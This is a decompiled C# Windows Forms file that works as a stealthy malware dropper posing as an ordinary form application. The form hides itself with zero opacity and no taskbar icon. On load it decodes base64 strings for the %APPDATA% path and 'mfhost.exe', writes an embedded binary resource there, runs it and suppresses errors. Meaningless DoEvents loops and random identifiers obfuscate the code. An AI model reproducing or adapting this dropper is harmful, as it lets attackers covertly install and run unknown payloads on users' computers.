using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using loadinghub.My.Resources;

namespace loadinghub;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("TreeView1")]
	private TreeView _TreeView1;

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual TreeView TreeView1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TreeView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TreeView1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		CheckBox1 = new CheckBox();
		Button1 = new Button();
		ComboBox1 = new ComboBox();
		NumericUpDown1 = new NumericUpDown();
		TreeView1 = new TreeView();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		Point location = new Point(443, 58);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		Size size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(0);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Button button = Button1;
		location = new Point(122, 42);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(198, 327);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(412, 98);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(121, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(2);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(648, 200);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(3);
		TreeView treeView = TreeView1;
		location = new Point(339, 98);
		((Control)treeView).set_Location(location);
		((Control)TreeView1).set_Name("TreeView1");
		TreeView treeView2 = TreeView1;
		size = new Size(121, 303);
		((Control)treeView2).set_Size(size);
		((Control)TreeView1).set_TabIndex(4);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(330, 264);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TreeView1);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void LEFJHjwehf()
	{
		int num = 232917;
		checked
		{
			do
			{
				Application.DoEvents();
				num++;
			}
			while (num <= 232922);
			int num2 = 1826656;
			do
			{
				Application.DoEvents();
				num2++;
			}
			while (num2 <= 1826661);
			Conversions.ToString(1319296);
			int num3 = 2595575;
			while (num3 < 2595585)
			{
				num3++;
				Application.DoEvents();
			}
			int num4 = 2617311;
			do
			{
				Application.DoEvents();
				num4++;
			}
			while (num4 <= 2617316);
			int num5 = 7839566;
			do
			{
				Application.DoEvents();
				num5++;
			}
			while (num5 <= 7839571);
			int num6 = 9508485;
			while (num6 < 9508495)
			{
				num6++;
				Application.DoEvents();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		byte[] byte_ = Resources.Byte_0;
		string text = Conversions.ToString(Operators.ConcatenateObject((object)Environment.GetEnvironmentVariable(Conversions.ToString(jYjLLdmBttdLRcLnndBkRnR("QVBQREFUQQ=="))), jYjLLdmBttdLRcLnndBkRnR("XG1maG9zdC5leGU=")));
		int num = 9610211;
		checked
		{
			do
			{
				Application.DoEvents();
				num++;
			}
			while (num <= 9610216);
			int num2 = 8656667;
			do
			{
				Application.DoEvents();
				num2++;
			}
			while (num2 <= 8656672);
			int num3 = 9325586;
			while (num3 < 9325596)
			{
				num3++;
				Application.DoEvents();
			}
			FileStream fileStream = File.Create(text);
			if (File.Exists(text))
			{
				((Form)this).Close();
			}
			try
			{
				fileStream.Write(byte_, 0, byte_.Length);
				int num4 = 8889029;
				do
				{
					Application.DoEvents();
					num4++;
				}
				while (num4 <= 8889034);
				int num5 = 8373769;
				do
				{
					Application.DoEvents();
					num5++;
				}
				while (num5 <= 8373774);
				int num6 = 5770203;
				while (num6 < 5770213)
				{
					num6++;
					Application.DoEvents();
				}
				fileStream.Close();
				Process.Start(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			((Form)this).Close();
		}
	}

	public object jYjLLdmBttdLRcLnndBkRnR(string hIfoekmXVwniaqjwm)
	{
		byte[] bytes = Convert.FromBase64String(hIfoekmXVwniaqjwm);
		return Encoding.UTF8.GetString(bytes);
	}
}
